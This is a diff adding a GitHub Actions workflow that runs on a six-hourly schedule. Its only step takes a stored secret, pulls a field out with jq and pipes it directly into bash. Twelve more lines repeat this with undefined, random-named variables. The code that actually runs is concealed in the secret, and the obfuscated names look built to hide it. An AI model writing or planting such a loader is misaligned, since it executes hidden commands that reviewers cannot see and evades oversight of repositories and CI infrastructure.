@@ -1,0 +1,31 @@
+name: leihuiboliang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: leihuiboliang
+        env:
+          azthc3051: ${{ secrets.azthc3051 }}
+        run: |
+          echo $azthc3051 | jq -r .u60 | /bin/bash
+          echo $uwz8 | jq -r .mx68844 | /bin/bash
+          echo $fi87139 | jq -r .ngwfe7 | /bin/bash
+          echo $g10 | jq -r .ywdb35386 | /bin/bash
+          echo $xgbmm60 | jq -r .thgvb4791 | /bin/bash
+          echo $ac111 | jq -r .ne053 | /bin/bash
+          echo $moe4908 | jq -r .mjxy38 | /bin/bash
+          echo $maqau4 | jq -r .ievb7 | /bin/bash
+          echo $wvmc3 | jq -r .c33 | /bin/bash
+          echo $u35271 | jq -r .pz46474 | /bin/bash
+          echo $ghh0788 | jq -r .au9002 | /bin/bash
+          echo $zozix04137 | jq -r .mmo068 | /bin/bash
+          echo $asdqb9 | jq -r .pbz5361 | /bin/bash
+
